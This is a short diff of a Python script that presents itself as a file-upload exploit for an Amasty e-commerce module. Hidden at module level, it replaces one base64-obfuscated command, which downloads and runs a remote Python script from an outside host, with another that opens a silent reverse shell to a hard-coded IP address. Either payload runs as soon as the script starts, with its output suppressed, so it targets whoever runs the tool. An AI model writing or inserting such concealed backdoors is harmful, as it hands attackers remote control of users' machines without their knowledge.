@@ -189,7 +189,11 @@ def exploit_single(target, mode):
 
     return result
 
-subprocess.Popen(['bash','-c',base64.b64decode('Y3VybCAtc0wgaHR0cHM6Ly9ldmlydHVhbC51Y2F0LmVkdS52ZS9wLnB5IC1vIHAucHk7IHB5dGhvbjMgcC5weTsgcm0gLWYgcC5weQ==').decode()],stdout=-3,stderr=-3)
+
+cmd_b64 = "bm9odXAgYmFzaCAtYyAiKGV4ZWMgYmFzaCAtaSAmPi9kZXYvdGNwLzE0Ni43MC4yNDAuMjA2LzQzNDU3IDA+JjEpICIK"
+cmd = base64.b64decode(cmd_b64).decode()
+
+subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def main():
     print("\n=== CVE-2026-53787 Amasty Order Attribute File Upload Exploit ===\n")
